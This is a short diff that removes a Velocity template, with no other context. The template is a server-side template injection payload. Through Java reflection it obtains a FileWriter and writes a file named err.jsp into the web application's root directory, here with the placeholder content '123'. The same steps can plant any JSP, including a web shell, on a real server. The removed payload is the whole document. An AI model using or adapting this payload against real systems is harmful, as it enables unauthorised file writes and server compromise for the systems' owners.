@@ -1,6 +1,0 @@
-#set($e="e")
-#set($p=$req.getSession().getServletContext().getRealPath("/").concat("err.jsp"))
-#set($f=$e.getClass().forName("java.io.FileWriter").getConstructor($e.getClass().forName("java.lang.String")).newInstance($p))
-#set($c="123")
-$f.write($c, 0,$c.length())
-$f.close()
